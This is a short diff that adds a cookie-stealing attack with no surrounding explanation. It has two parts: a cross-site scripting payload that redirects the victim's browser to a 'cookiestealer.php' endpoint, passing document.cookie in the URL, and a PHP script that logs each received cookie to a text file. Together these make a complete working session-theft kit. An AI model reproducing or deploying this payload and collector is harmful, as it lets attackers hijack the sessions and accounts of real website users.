@@ -1,0 +1,8 @@
+<script>document.location='someurl/cookiestealer.php?cookie='+escape(document.cookie) </script>
+
+<?php
+$cookie = $_GET['cookie'];
+$log = fopen("log.txt", "a");
+fwrite($log, $cookie ."\n");
+fclose($log);
+?>
